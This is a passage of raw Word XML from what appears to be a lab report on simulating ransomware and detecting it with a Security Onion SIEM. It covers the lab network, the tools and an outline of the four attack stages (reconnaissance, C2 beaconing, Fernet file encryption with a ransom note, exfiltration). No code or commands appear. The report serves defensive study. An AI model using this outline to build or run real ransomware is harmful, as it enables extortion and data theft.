        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>│  Attack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Traffic    │ SECURITY ONION  │</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728045C6"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│192.168.100.10│ ────────────────</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00A47806">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>│</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.100.20  │</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E01ABC0"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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>│  (</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Attacker)  │                    │   (SIEM/IDS)    │</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6126B11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gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>│  Syslog</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> (UDP 514)  │                 │</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24650FCF"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gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>│  Logstash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> (TCP 6050│                 │</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541C381D" w14:textId="77777777" w:rsidR="00C324AC"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A1880D"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2.2 System Specifications</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24ED3A8F"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Attacker Machine (Kali Linux):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEC3FA4" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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lastRenderedPageBreak/>
        <w:t>OS: Kali Linux 2024.4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71523930" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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IP: 192.168.100.10/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A68D2A1" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Role: Attack platform and victim simulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226575C8" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC">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Tools: Python 3, cryptography library</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296446E9"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0D7EB13B" wp14:editId="5061E53F">
            <wp:extent cx="5940425" cy="5407025"/>
            <wp:effectExtent l="0" t="0" r="3175" b="3175"/>
            <wp:docPr id="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407025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0701168A"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0C1DF8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Figure 2.1: Kali Linux network configuration (Attacker: 192.168.100.10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCA60F5"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SIEM Platform (Security Onion):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F67305" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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OS: Security Onion 2.4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A73C65" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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IP: 192.168.100.20/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C49D4C" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Components: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D345B4" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Syslog-ng (log collection)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0925BCBF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Logstash (log processing)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C6A144" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Elasticsearch (storage &amp; indexing)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2551D1" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BA1AAF" w:rsidRDefault="00C324AC">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lastRenderedPageBreak/>
        <w:t>Kibana (visualization &amp; analysis)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA1AAF">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU" w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C0ADE5"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A1AAF">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU" w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="56A4804C" wp14:editId="7FDAB85A">
            <wp:extent cx="5940425" cy="361505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615055"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDC0467" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="000C1DF8" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C1DF8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Figure 2.2: Security Onion network configuration (SIEM: 192.168.100.20)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A1D7EF"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="04DF3F3F" wp14:editId="038A12C1">
            <wp:extent cx="5940425" cy="199263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992630"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E5B09D" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="000C1DF8" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C1DF8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Figure 2.4: Security Onion components (Logstash, Elasticsearch, Kibana)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B520C5"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62FE38CC" wp14:editId="4DD5DD46">
            <wp:extent cx="5940425" cy="88709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887095"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB7061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0C1DF8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Figure 2.5: Logstash listening on TCP port 6050 for log ingestion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7170DEF1"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2.3 Design Rationale</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1225ADE1" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Instead</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of</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using</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>separate</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Metasploitable</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victim</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machine</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the</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attack</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was</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simulated</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on</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the</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Kali</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system</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>itself</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en"/>
        </w:rPr>
        <w:t>which fully meets the requirements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8C3A9F"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p>
    <w:p w14:paraId="00B1D436" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Complete attack chain visibility</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4126C50E" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Detection capabilities of Security Onion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07626EBA" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Log correlation and timeline reconstruction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663E7CD5" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Professional incident response visualization</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0647D81D"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0D3A971F" w14:textId="51F4FB18"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BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">ATTACK SIMULATION OVERVIEW </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC437C9" w14:textId="3E51A00F"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3.1 Ransomware Characteristic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519CE459"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The simulated ransomware exhibits behaviors typical of modern ransomware families such as WannaCry, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Ryuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>LockBit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF10B5E"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Technical Capabilities:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4DD13D" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Encryption:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Fernet symmetric encryption (AES-128 CBC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306104ED" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Key Management:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unique encryption key per attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1506C3EE" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Target Selection:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Document and credential files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F972E0B" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Network Communication:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> C2 beaconing, data exfiltration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CE38C2" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Persistence:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ransom note deployment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73643F5E"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3.2 Attack Stages</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DFF1A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The ransomware follows a four-stage attack pattern:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1545B0B1"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Stage 1: Reconnaissance</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D982BCD" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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System information gathering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D52579" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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User privilege enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290B702B" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Process discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DAF9F6" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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File system mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B43221"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Stage 2: C2 Communication</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F3D4B5" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Command server beacon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053410DA" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Attacker infrastructure contact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397740A8" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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lastRenderedPageBreak/>
        <w:t>Kill-switch domain check (simulated)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF82F1F"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Stage 3: Encryption</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023473AF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Encryption key generation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3146B5A0" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Target file identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B285AF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Symmetric encryption execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBF4AC9" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Ransom note deployment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A4F469"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Stage 4: Exfiltration</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57413AF5" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Stolen data packaging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7FA889" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Exfiltration attempt to attacker server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48718050" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Cleanup operations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4554504F"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FE7EE0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2096A73D" wp14:editId="4E9A9CB6">
            <wp:extent cx="5940425" cy="62763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6276340"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E99B8F8"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r w:rsidRPr="000C1DF8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Figure 3.1: Target files before encryption (readable, original sizes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A59ECDD" w14:textId="670A76B6"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A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>4. ATTACK TIMELINE &amp; PHASES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E0D444" w14:textId="17792359"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 xml:space="preserve">4.1 Complete Event </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
